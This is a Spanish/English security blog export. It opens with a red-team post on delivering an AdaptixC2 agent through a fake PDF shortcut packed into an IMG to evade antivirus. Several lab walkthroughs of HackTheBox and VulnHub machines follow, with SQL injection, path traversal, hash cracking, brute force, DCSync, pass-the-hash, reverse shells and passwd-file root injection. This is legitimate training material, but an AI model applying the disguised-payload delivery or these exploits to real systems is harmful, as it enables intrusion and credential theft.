[{"categories":["Red Team"],"content":"Execution method Agent C2 ","date":"2025-06-06","objectID":"/en/agentec2/:0:0","tags":["Red Team","C2","AdaptixC2","Acceso Inicial"],"title":"Método de ejecución Agente C2","uri":"/en/agentec2/"},{"categories":["Red Team"],"content":"Introduction In this post I am going to describe a way how an attacker or members of a Red Team can elaborate a malicious file and be executed in the target machine in order to gain access without being detected by the antivirus. For this post I have used the Command and Control AdaptixC2, I will not go into depth on how to install it because in the documentation itself is well detailed the process. Although if you encounter any problems when installing the GO version I recommend you to download the package directly from the official website here. I leave the repository of AdaptixC2 here and its documentation here. ","date":"2025-06-06","objectID":"/en/agentec2/:1:0","tags":["Red Team","C2","AdaptixC2","Acceso Inicial"],"title":"Método de ejecución Agente C2","uri":"/en/agentec2/"},{"categories":["Red Team"],"content":"Listener and Agent creation Once we have executed the server and the client, the client interface will appear, the first thing we must do is to create a listener to which our generated agent will connect later. For this Post I am going to use a listener of HTTP type, for it we must click in the left superior corner in the icon of the helmets. Once the listeners tab is open, right click \u003e Create and the following window will appear: From here we can configure our listener, for this test I have only made changes in the Main settings tab, but you can also configure the HTTP headers, an error page and the Payload page. We indicate a name and add the ip of the machine where the server is running and a port, at the end it should look something like this: To finish this step we only need to generate the agent, to do so we right click on the listener just created. The following window will appear: For this test I have not made any changes, but as you can see we can modify the architecture, the type of format, the Sleep field, when we want the remote connection to end and the active time of the agent. We click on Generate and save our agent. ","date":"2025-06-06","objectID":"/en/agentec2/:2:0","tags":["Red Team","C2","AdaptixC2","Acceso Inicial"],"title":"Método de ejecución Agente C2","uri":"/en/agentec2/"},{"categories":["Red Team"],"content":"Shell Link For the execution of our agent I am going to use a .lnk file generated with PowerShell which will execute our agent and a pdf that we want to show to the target user as a decoy. This option is interesting because even if the user has enabled the option to view the extension in the browser, the .lnk extension will not be visible. $wsh = New-Object -ComObject WScript.Shell $lnk = $wsh.CreateShortcut(\"C:\\Payloads\\Documento.pdf.lnk\") $lnk.TargetPath = \"%COMSPEC%\" $lnk.Arguments = \"/C start agent.64.exe \u0026\u0026 start Documento.pdf\" $lnk.IconLocation = \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe,13\" $lnk.Save() If the pdf icon is not displayed it can be changed by clicking on properties and change icon. ","date":"2025-06-06","objectID":"/en/agentec2/:3:0","tags":["Red Team","C2","AdaptixC2","Acceso Inicial"],"title":"Método de ejecución Agente C2","uri":"/en/agentec2/"},{"categories":["Red Team"],"content":"Container Once we have the three files: Document.pdf(decoy), Agent.64.exe(payload) and Document.pdf.lnk(trigger) we pack them in a single zip file to avoid having to send multiple files to the target. Mark of the web(MotW) is a zone identifier that is used to mark files downloaded from the Internet as potentially unsafe. This can be seen in a file by viewing its properties in Explorer or using PowerShell. Some archive formats support hidden files, and some do not propagate MotW. This repository by Nobutaka Mantani contains a comparison of MotW propagations. To pack our files I am going to use the PackMyPayload tool. First I add the files to a folder. ls -l total 100 -rw-r--r-- 1 n1kto n1kto 80384 Jun 5 16:22 agent.x64.exe -rw-rw-r-- 1 n1kto n1kto 13264 Jun 5 2025 Documento.pdf -rw-rw-r-- 1 n1kto n1kto 1859 Jun 5 2025 Documento.pdf.lnk And I pack them in an IMG format file hiding agen.exe and Document.pdf using the -H parameter. python3 PackMyPayload.py -H agent.64.exe,Documento.pdf ~/Desktop/container ~/Desktop/container/package.img ","date":"2025-06-06","objectID":"/en/agentec2/:4:0","tags":["Red Team","C2","AdaptixC2","Acceso Inicial"],"title":"Método de ejecución Agente C2","uri":"/en/agentec2/"},{"categories":["Red Team"],"content":"Delivery and execution Finally we transfer our generated file to the target machine by raising a python server: python -m http.server 8000 and in the target machine from PowerShell we download it: iwr -Uri http://192.168.154.128:8000/package.img -Outfile package.img We open package.img and open the file it contains, thus producing the connection of the agent with our Command and control and all this with Windows Defender activated. I remind you that this post is for educational and ethical purposes and should not be used for illegal purposes. ","date":"2025-06-06","objectID":"/en/agentec2/:5:0","tags":["Red Team","C2","AdaptixC2","Acceso Inicial"],"title":"Método de ejecución Agente C2","uri":"/en/agentec2/"},{"categories":["HacktheBox"],"content":"Sauna ","date":"2023-11-08","objectID":"/en/sauna/:0:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/en/sauna/"},{"categories":["HacktheBox"],"content":"Scanning and enumeration Once connected to the VPN and the hackthebox machine started the scanning and enumeration phase by launching the nmap tool by performing a port scan to get services and versions of open ports. We started the machine by launching a port scan with nmap. nmap -T4 -p- -A 10.10.10.175 Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-05 13:43 EST Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan Parallel DNS resolution of 1 host. Timing: About 0.00% done Stats: 0:00:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 0.13% done Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 1.62% done; ETC: 13:53 (0:10:07 remaining) Stats: 0:00:18 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.25% done; ETC: 13:52 (0:08:41 remaining) Stats: 0:00:19 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 2.61% done; ETC: 13:51 (0:08:04 remaining) Stats: 0:02:19 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 75.00% done; ETC: 13:45 (0:00:13 remaining) Stats: 0:03:07 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan NSE Timing: About 99.96% done; ETC: 13:46 (0:00:00 remaining) Nmap scan report for 10.10.10.175 Host is up (0.040s latency). Not shown: 65515 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-11-06 01:45:04Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49668/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49689/tcp open msrpc Microsoft Windows RPC 49696/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-11-06T01:46:05 |_ start_date: N/A |_clock-skew: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required TRACEROUTE (using port 139/tcp) HOP RTT ADDRESS 1 40.04 ms 10.10.14.1 2 40.24 ms 10.10.10.175 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 206.70 seconds Observing the result, I see that it is a domain controller and that the domain is EGOTISTICAL-BANK.LOCAL and the first thing I can think of is how to get valid users of the domain controller. First I launch the rpcclient tool to see if I can get users but I’m not successful as the null session is not enabled (access without credentials). rpcclient -U '' 10.10.10.175 -c 'enumdomusers' Then I will make an enume","date":"2023-11-08","objectID":"/en/sauna/:1:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/en/sauna/"},{"categories":["HacktheBox"],"content":"Explotation Launch the kerbrute tool again with the new list ./kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.local users.txt And we get a hash $krb5asrep$18$fsmith@EGOTISTICAL-BANK.LOCAL:d4b3b166aac99836201bbe442d83f8cd$484c733a9d5ce4f6f20f4b522a7b721609c0dacefb845b4f7c1e49a8d1b1886611fba87622cef20aff5ba5447b10f3da794c393744cd2678e94e9ba2ba92a0d29e202ec1d864885b9a9f6a5df463b11587dbc48f3bc0424f710d43ac0d8555b38379f35c1b94a4892669fde4d69cf2bf001f9b792e2180c6f1ea53a28f8900a93e5111c161948f91a64be36c5c8c854d8d90203ce6aab155bde6d3908e8a5c3143fe98830852f808ff8badd93090a4b29421c27a5aba7f98d66ffaa31a292b7b04415d2e0a93b1fba14a5a5f7f614bf0677e9b53c8f7673becdd9873390fc64f8231c99c14846280f5858e81eb472cbaa30156a5ddf7f4a8a641758ccb19775e9f6c8156ceda4f1485078e48b4b7fc6a44cd0ca8aa80 We cracked it with echo '$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a9954ba527554fb3bede345eec9cdb16$96156f42762421bd97ebf37e092cfffebf37bde8f60743e36f9d7f78c1f0b18f7150361cda4e8f48cbc6b73800a480bb728497ef44355869649c910ba1fe98a5212f7a160a011316a703857fc2cd0d0ce24b527a97fc75f3205931a7caf7c01f329c76313cbf696df729fa52acadf61e9275a10d2fe9bf89bb2c0ae8ea6cfa419ae71cfbdcf554cb1685597c3e764861459a0dfa6b92bb2f5432cefb7ed57cfcc423176b9e2b454675711837b4ca1d17ef0188b4befa8f52d873ccd3e87b337b390fe1eae5a1654b14c596fb5ae16c2c160d48b57e247a765f616cd6cb6a8b7bf02a92100070367128f0a7267397874ed038fbeb13631f3ab51edead31e36609' \u0026gt; hash.txt john -w=/usr/share/wordlists/rockyou.txt hash.txt I login with winmr evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175 ","date":"2023-11-08","objectID":"/en/sauna/:2:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/en/sauna/"},{"categories":["HacktheBox"],"content":"Privilege Escalation Once in the system I pass WinPeas in search of being able to escalate privileges and i find the following password in plain text. If we try to initiate session with the svc_loanmanager user but we will not succeed if we perform the next command we will see the users of the system net user We notice that the name is svc_loanmgr We are now in session with the new user evil-winrm -u svc_loanmgr -p Moneymakestheworldgoround! -i 10.10.10.175 After an enumeration I see that I have the same permissions as the fsmith user. So I try to use BloodHound Transfer SharpHound ps1 to the machine. #On kali locate SharpHound.ps1 cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 . #on winrm upload SharpHound.ps1 #Import . .\\SharpHound.ps1 # run it Invoke-BloodHound -CollectionMethod All #Transfer the zip to our machine download 20231106220357_BloodHound.zip We started sudo bloodhound We look for the names of the users we have access to and dial them as owned after we see that we can make a Dcsync attack by clicking the analyst section the Find Shortest Paths to domain We click where DCSync says, select and indicate how to perform the DCSync With secretdump we get the hashes to make a PasstheHash /opt/impacket/examples/secretsdump.py 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@10.10.10.175 We connect with evil-winrm -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e -i 10.10.10.175 and we get a powershell as administrator. ","date":"2023-11-08","objectID":"/en/sauna/:3:0","tags":["Walkthrough","HackTheBox","TjNull","OSCP","Easy","AD","Active directory"],"title":"Sauna Walkthrough","uri":"/en/sauna/"},{"categories":["Vulnhub"],"content":"#DC-9 Machine page: https://www.vulnhub.com/entry/dc-9,412/ Download link: https://download.vulnhub.com/dc/DC-9.zip Dc-9 is one of the machines from vulnhub that contains the list of Tjnull, which is a list created to prepare for the OSCP exam, this machine is the first on the list with a similar level to the machines in the course that the OSCP offers. ","date":"2023-09-23","objectID":"/en/dc-9/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/en/dc-9/"},{"categories":["Vulnhub"],"content":"Network Scan The first step is to find the IP of our target, for this we use Arp-Scan, this tool allows us to scan a LAN network and discover devices connected to it. sudo arp-scan -interface eth1 -l We have discovered that our target’s IP is 192.168.34.5. Once the IP is obtained, we proceed to scan ports and services with nmap. sudo nmap -sV 192.168.34.5 Starting Nmap 7.93 (https://nmap.org) at 2023-09-17 19:06 CEST Nmap scan report for example.com (192.168.34.5) Host is up (0.00052s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp filtered ssh 80/tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC) Service detection performed. Please report any incorrect results at https://nmap.org/submit/. Nmap done: 1 IP address (1 host up) scanned in 6.83 seconds We see that port 80 is open and Apache is running with version 2.4.38. We also see that the ssh port is filtered but little can be done with the information we have so far so we move on to view the website on port 80. ","date":"2023-09-23","objectID":"/en/dc-9/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/en/dc-9/"},{"categories":["Vulnhub"],"content":"Enumeration Browsing the web I see that there is a ‘search’ field that performs a search for the company’s users. The first thing that occurs to me is to test if it is vulnerable to SQLi, so I enter the following query: Mary' or 1=1-- - And I see that it is vulnerable to SQL so I proceed to obtain information from the database. First I get the number of columns by adding the null value for each column until I get a response with the following query: Mary' union select null,null,null,null,null,null-- - Then I go on to list the databases that exist, with the following query: Mary' union select null,schema_name,null,null,null,null from information_schema.schemata-- - We see that the Staff and users databases exist. The next step I take is to list the tables contained in the users database Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='users'-- - And I see that the UserDetails table exists, then I go on to list the columns of this table. Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='UserDetails'-- - I get the columns id, firstname, lastname, username, password, and reg_date, so all that remains is to list the contents of the columns. With the following query I indicate that the values ​​of the username and password columns are displayed, indicating the table that belongs to the users database. Mary' union select null,CONCAT(username, \":\" ,password),null,null,null,null from users.UserDetails-- - marym:3kfs86sfd julied:468sfdfsd2 fredf:4sfd87sfd1 barneyr:RocksOff tomc:TC\u0026TheBoyz jerrym:B8m#48sd wilmaf:Pebbles bettyr:BamBam01 chandlerb:UrAG0D! joeyt:Passw0rd rachelg:yN72#dsd rossg:ILoveRachel monicag:3248dsds7s phoebeb:smellycats scooters:YR3BVxxxw87 janitor:Ilovepeepee janitor2:Hawaii-Five-0 I save the credentials in a file called creds. We obtain a list of users and passwords but they are not valid in the web login so we go on to list the Staff database in the same way that we have done with users. Mary' union select null,table_name,null,null,null,null from information_schema.tables where table_schema='Staff'-- - Mary' union select null,column_name,null,null,null,null from information_schema.columns where table_name='Users'-- - Mary' union select null,CONCAT(username,':',password),null,null,null,null from Users-- - We obtain admin user and an md5 hash. With the hash I proceed to crack it on an online website https://crackstation.net/ admin:856f5de590ef37314e7c3bdf6f8a66dc And I get the password: transorbital1 ","date":"2023-09-23","objectID":"/en/dc-9/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/en/dc-9/"},{"categories":["Vulnhub"],"content":"Explotation Login After logging in we see a section at the bottom of the page that says File does not exist, it seems that it is trying to load a file but it does not exist, this makes me think that it may be looking for a file in some system path so I try the next. http://192.168.34.5/manage.php?file=../../../../../../../etc/passwd We are successful, in the scan with nmap we discovered that the ssh port was filtered and what comes to mind is the Port Knocking technique so I am going to see the Knock configuration files http://192.168.34.5/manage.php?file=../../../../../../../etc/knockd.conf We obtain the sequence to introduce with knock knock -v 192.168.34.5 7469 8475 9842 hitting tcp 192.168.34.5:7469 hitting tcp 192.168.34.5:8475 hitting tcp 192.168.34.5:9842 I check that the port has been opened nmap -sV 192.168.34.5 Starting Nmap 7.93 (https://nmap.org) at 2023-09-17 19:20 CEST Nmap scan report for example.com (192.168.34.5) Host is up (0.00012s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) 80/tcp open http Apache httpd 2.4.38 ((Debian)) MAC Address: 08:00:27:C1:23:27 (Oracle VirtualBox virtual NIC) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/. Nmap done: 1 IP address (1 host up) scanned in 6.54 seconds With the users obtained previously I perform a brute force attack with hydra I create a file with users cat creds | cut -d ':' -f1 \u003e users.txt I create passwords file cat creds | cut -d ':' -f2 \u003e passwords.txt hydra -L users.txt -P passwords.txt 192.168.34.5 ssh Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-23 13:27:05 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task [DATA] attacking ssh://192.168.34.5:22/ [22][ssh] host: 192.168.34.5 login: chandlerb password: UrAG0D! [22][ssh] host: 192.168.34.5 login: joeyt password: Passw0rd [22][ssh] host: 192.168.34.5 login: janitor password: Ilovepeepee [STATUS] 287.00 tries/min, 287 tries in 00:01h, 4 to do in 00:01h, 14 active 1 of 1 target successfully completed, 3 valid passwords found [WARNING] Writing restore file because 1 final worker threads did not complete until end. [ERROR] 1 target did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-23 13:28:08 chandlerb:UrAG0D joeyt:Passw0rd janitor:Ilovepeepee Login as janitor ssh janitor@192.168.34.5 Enumerating we find the following directory Inside we find the file passwords-found-on-post-it-notes.txt with the following passwords BamBam01 Passw0rd smellycats P0Lic#10-4 B4-Tru3-001 4uGU5T-NiGHts I perform a new brute force attack with the passwords obtained hydra -L users.txt -P newpasswords 192.168.34.5 ssh Hydra v9.4 (c) 2022 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-17 20:34:37 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 102 login tries (l:17/p:6), ~7 tries per task [DATA] attacking ssh://192.168.34.5:22/ [22][ssh] host: 192.168.34.5 login: fredf password: B4-Tru3-001 [22][ssh] host: 192.168.34.5 login: joeyt password: Passw0rd 1 of 1 target successfully completed, 2 valid passwords found [WARNING] Writing resto","date":"2023-09-23","objectID":"/en/dc-9/:3:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/en/dc-9/"},{"categories":["Vulnhub"],"content":"Privilege Escalation Login as fredf ssh fredf@192.168.34.5 We execute sudo -l and see that we have permissions to execute the following script I run it to see how it works It seems that two files are introduced, the first one that it reads and the second one to which the content of the first one is added, so to escalate privileges I am going to create a user and add it to the passwd file Creating the user hash (123) openssl passwd -1 $1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1 We create a file with the following (user.txt) user:$1$buZKpXN3$NPI6IUJkJTJKQTwGdqfyo1:0:0:user:/root:/bin/bash We execute script sudo /opt/devstuff/dist/test/test user.txt /etc/passwd we change the new user as root fredf@dc-9:~$ su user Password: root@dc-9:/home/fredf# whoami root And that’s it Happy Hacking! ","date":"2023-09-23","objectID":"/en/dc-9/:4:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Medium"],"title":"DC-9 Walkthrough","uri":"/en/dc-9/"},{"categories":["Vulnhub"],"content":"Kioptrix level 5 ","date":"2023-09-02","objectID":"/en/kioptrix_level_5/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/en/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Setup For the machine to assign an ip you must remove the network adapter and add it again. ","date":"2023-09-02","objectID":"/en/kioptrix_level_5/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/en/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Resolution ","date":"2023-09-02","objectID":"/en/kioptrix_level_5/:2:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/en/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Vulnerability scanning and analysis I start by doing a scan of the local network with arp-scan to discover the ip of the target machine. arp-scan -I eth0 --localnet -I -\u003e indicate the interface --localnet -\u003e we indicate to generate addresses from the interface configuration. I get that the ip of my target is 192.168.66.163, so I do a port scan with nmap. nmap -p- --open -T5 -n -Pn -vvv 192.168.66.163 -oN Target Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:46 EDT Initiating ARP Ping Scan at 15:46 Scanning 192.168.66.163 [1 port] Completed ARP Ping Scan at 15:46, 0.06s elapsed (1 total hosts) Initiating SYN Stealth Scan at 15:46 Scanning 192.168.66.163 [65535 ports] Discovered open port 80/tcp on 192.168.66.163 Discovered open port 8080/tcp on 192.168.66.163 Stats: 0:00:10 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 9.90% done; ETC: 15:48 (0:01:31 remaining) Completed SYN Stealth Scan at 15:47, 53.95s elapsed (65535 total ports) Nmap scan report for 192.168.66.163 Host is up, received arp-response (0.00015s latency). Scanned at 2023-08-31 15:46:49 EDT for 54s Not shown: 65532 filtered tcp ports (no-response), 1 closed tcp port (reset) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 80/tcp open http syn-ack ttl 64 8080/tcp open http-proxy syn-ack ttl 64 MAC Address: 00:0C:29:5B:14:9E (VMware) Read data files from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 54.25 seconds Raw packets sent: 131110 (5.769MB) | Rcvd: 50 (2.410KB) I notice that ports 80 and 8080 are open, and I perform a second, more specific scan to obtain the version of the services running. ──(root㉿kali)-[/home/kali/vulnhub/OSCP/kioptrix_level_5] └─# nmap -p80,8080 -sCV 192.168.66.163 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-31 15:49 EDT Nmap scan report for 192.168.66.163 Host is up (0.00040s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8) 8080/tcp open http Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8) |_http-title: 403 Forbidden MAC Address: 00:0C:29:5B:14:9E (VMware) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds After reviewing the results I noticed that the version of mod_ssl/2.2.21 is vulnerable but the exploit for this vulnerability does not contain a valid version for FreeBSD apache 2.2.21 so it did not work. I then went on to check the web with port 80. And when I opened the source code of the page I discovered a url address. When I opened it I discovered the following: ","date":"2023-09-02","objectID":"/en/kioptrix_level_5/:2:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/en/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Exploitation Searching what phpchart is I found out that it is a php library to display text data graphically. Then I searched if there is any vulnerability for this version and I found the following page. Exploiting pChart 2.1.3 (Directory traversal \u0026 XSS) Reading I see that it is vulnerable to directory traversal so I enter the following address and get the /etc/passwd file http://192.168.66.163/pChart2.1.3/examples/index.php?Action=View\u0026Script=/../../../../etc/passwd Reading a little more the web I discover that FreeBSD operating systems have the Apache configuration file in the following path, so I will read it now. /usr/local/etc/apache22/httpd.conf Observing the result and after trying a log poison without success I see that the configuration file shows an allowed User-Agent (Mozilla/4.0 Mozilla4 browser) and a virtualHost on port 8080. Through a browser extension I change the user agent https://addons.mozilla.org/en-US/firefox/addon/user-agent-switcher-revived/ With the user agent changed I perform the web search with port 8080 and I see the following. I click on phptax and the following page appears. Searching for an exploit for phptax I find the following exploits I have decided to use metasploit so by executing the following series of commands I get a shell. #start metasploit msfconsole -q #exploit search search phptax #select exploit use 0 #setup options set RHOSTS 192.168.66.163 set RPORT 8080 show advanced set UserAgent Mozilla/4.0 Mozilla4_browser set payload payload/cmd/unix/reverse set LHOST 192.168.66.152 set LPORT 4444 run ","date":"2023-09-02","objectID":"/en/kioptrix_level_5/:2:2","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/en/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Privilege escalation We obtain a shell and enumerate. whoami www id uid=80(www) gid=80(www) groups=80(www) uname -a FreeBSD kioptrix2014 9.0-RELEASE FreeBSD 9.0-RELEASE #0: Tue Jan 3 07:46:30 UTC 2012 root@farrell.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC amd64 After enumerating a little bit the next step I did was to search if there is any exploit for the FreeBSD version of the machine. There is an exploit to escalate privileges so I download it on my machine and then transfer it to the target machine with netcat. searchsploit -m freebsd/local/26368.c Exploit: FreeBSD 9.0 \u003c 9.1 - 'mmap/ptrace' Local Privilege Escalation URL: https://www.exploit-db.com/exploits/26368 Path: /usr/share/exploitdb/exploits/freebsd/local/26368.c Codes: CVE-2013-2171, OSVDB-94414 Verified: True File Type: C source, ASCII text Copied to: /home/kali/vulnhub/OSCP/kioptrix_level_5/26368.c I listen on my kali and connect from the target machine to perform the transfer in the /tmp directory. #Kali nc -lvp 4444 \u003c 26368.c listening on [any] 4444 ... #kioptrix nc -nv 192.168.66.152 4444 \u003e 26368.c Connection to 192.168.66.152 4444 port [tcp/*] succeeded! once transferred I compile the exploit and run it getting a shell as root gcc 26368.c -o exploit ./exploit whoami root id uid=0(root) gid=0(wheel) egid=80(www) groups=80(www) cat congrats.txt If you are reading this, it means you got root (or cheated). ","date":"2023-09-02","objectID":"/en/kioptrix_level_5/:2:3","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 5 Walkthrough","uri":"/en/kioptrix_level_5/"},{"categories":["Vulnhub"],"content":"Kioptrix Level 3 ","date":"2023-08-25","objectID":"/en/kioptrix_level_3/:0:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/en/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Machine Resolution ","date":"2023-08-25","objectID":"/en/kioptrix_level_3/:1:0","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/en/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Scanning and Vulnerability Analysis We start with a scan of our local network with the arp command to obtain the ip of our target machine. arp-scan -I eth0 --localnet Once the ip is obtained we proceed to perform a scan with nmap. nmap -sCV 192.168.66.161 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-25 13:37 EDT Nmap scan report for kioptrix3.com (192.168.66.161) Host is up (0.0099s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) | ssh-hostkey: | 1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA) |_ 2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch |_http-title: Ligoat Security - Got Goat? Security ... Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds After scanning with nmap we see that port 80 is open with an http service so let’s see what it contains using our browser in this case Firefox and we see the following website. In the description of the machine tells us to add the domain kioptrix3.com to our file /etc/hosts to be able to see the web so we open it and add the following: 192.168.66.161 kioptrix3.com ","date":"2023-08-25","objectID":"/en/kioptrix_level_3/:1:1","tags":["Walkthrough","Vulnhub","TjNull","OSCP","Easy"],"title":"Kioptrix Level 3 Walkthrough","uri":"/en/kioptrix_level_3/"},{"categories":["Vulnhub"],"content":"Exploitation After surfing the site we can see that the web is made with LotusCMS. So we went to Google to find out if there is any exploit for this CMS and we found the following: https://github.com/Hood3dRob1n/LotusCMS-Exploit we clone it to our machine and run ./lotusRCE.sh kioptrix3.com / #Enter our ip 192.168.66.152 #Port 4444 #In another terminal start netcat nc -nlvp 4444 #select option 1 1 #we have a shell nc -nlvp 4444 listening on [any] 4444 ... connect to [192.168.66.152] from (UNKNOWN) [192.168.66.161] 38651 whoami www-data We performed a tty treatment to work more comfortably and to be able to do Ctrl+C. script /dev/null 